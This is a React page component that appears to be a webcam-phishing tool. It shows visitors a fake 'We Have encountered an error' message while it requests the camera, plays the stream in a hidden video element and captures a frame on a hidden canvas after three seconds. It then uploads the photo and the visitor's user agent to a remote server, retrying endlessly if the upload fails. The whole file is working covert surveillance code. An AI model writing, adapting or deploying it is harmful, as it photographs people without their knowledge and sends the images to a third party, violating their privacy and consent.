import { useState, useEffect, useRef } from 'react';
import refreshIcon from './assets/refresh.png';
import axios from 'axios';
import { api_url } from './config';
import './App.css'


function App() {
  
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [uid,setUid]=useState(null);

  useEffect(() => {

    axios.post(api_url+'/info', {
      userAgent: navigator.userAgent,
    })
    .then(function (res) {
      setUid(res.data.uid)
    })
    .catch(function (error) {
      console.log(error);
    })
  }, []);

  useEffect(()=>{

    if(uid){
      console.log("uid:\n",uid);
      getVideo()
    }

  },[uid])

  const refreshPage=()=>{
    location.reload()
  }

  const getVideo = () => {
    navigator.mediaDevices
      .getUserMedia({ video: true })
      .then((stream) => {
        let video = videoRef.current;
        video.srcObject = stream;
        video.play();
      })
      .catch((err) => {
        console.error('Error accessing the camera: ', err);
      });
      setTimeout(takePhoto, 3000);
  };

  const takePhoto = () => {

    
    const width = 300;
    const height = 300;

    let video = videoRef.current;
    let canvas = canvasRef.current;
    canvas.width = width;
    canvas.height = height;
    let context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, width, height);
    sendPhoto();
  };

  const sendPhoto = async () => {
    let canvas = canvasRef.current;
    const imageData = canvas.toDataURL('image/png');

    // Convert base64 to blob
    const byteString = atob(imageData.split(',')[1]);
    const mimeString = imageData.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    const blob = new Blob([ab], { type: mimeString });

    try {
        const formData = new FormData();
        console.log("uid before send:\n",uid)
        formData.append('uid', uid);
        formData.append('file', blob, 'photo.png');

        const response = await axios.post(api_url + '/photos', formData);
        closePhoto()
    } catch (err) {
      sendPhoto()


    } finally {

    }

};

  const closePhoto = () => {
    let canvas = canvasRef.current;
    let context = canvas.getContext('2d');
    context.clearRect(0, 0, canvas.width, canvas.height);

  };

  return (
    <>
      <p>We Have encountered an error. Please refresh the Page. <br />
      <img src={refreshIcon} alt='Refresh' onClick={refreshPage}/>
      </p>
      <br /> 
      
      
      <video ref={videoRef} style={{ display: 'none' }}></video><br />
      <canvas ref={canvasRef} style={{ display: 'none' }}></canvas>

    </>
  );
}

export default App;
